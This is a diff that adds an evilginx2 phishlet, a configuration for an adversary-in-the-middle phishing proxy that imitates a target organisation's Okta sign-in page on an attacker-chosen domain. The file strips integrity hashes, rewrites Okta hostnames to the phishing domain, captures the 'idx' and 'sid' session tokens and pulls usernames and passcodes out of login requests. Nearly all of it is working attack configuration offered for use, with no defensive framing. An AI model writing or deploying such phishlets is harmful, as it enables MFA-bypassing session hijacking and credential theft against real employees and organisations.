@@ -1,0 +1,27 @@
+aeeuthor: '@targeted-ops'
+min_ver: '2.3.0'
+params:
+  - {name: 'subdomain', default: 'CLIENT', required: true}
+  - {name: 'phish-domain', default: 'phish-domain.com', required: true}
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: '{subdomain}.okta.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: '{subdomain}.okta.com', session: true, is_landing: false }
+  - {phish_sub: '{subdomain}', orig_sub: '{subdomain}', domain: '{phish-domain}', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: '{subdomain}.okta.com', orig_sub: '', domain: '{subdomain}.okta.com', search: 'sha384-.{64}', replace: '', mimes: ['text/html']}
+  - {triggers_on: '{subdomain}.okta.com', orig_sub: '', domain: '{subdomain}.okta.com', search: '{subdomain}.okta.com', replace: '{phish-domain}', mimes: ['application/ion+json']}
+auth_tokens:
+  - domain: '{subdomain}.okta.com'
+    keys: ['idx','sid,opt'] # 'idx' if using OIE and factor sequencing, 'sid' if not (default). using opt here means 'optional'. if its there, catch it. https://github.com/kgretzky/evilginx2/wiki/Phishlet-File-Format-(2.3.0)#keys-modifiers
+credentials:
+  username:
+    key: ''
+    search: '"identifier":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"passcode":"([^"]*)'
+    type: 'json'
+login:
+  domain: '{subdomain}.okta.com'
+  path: '/login/login.htm'
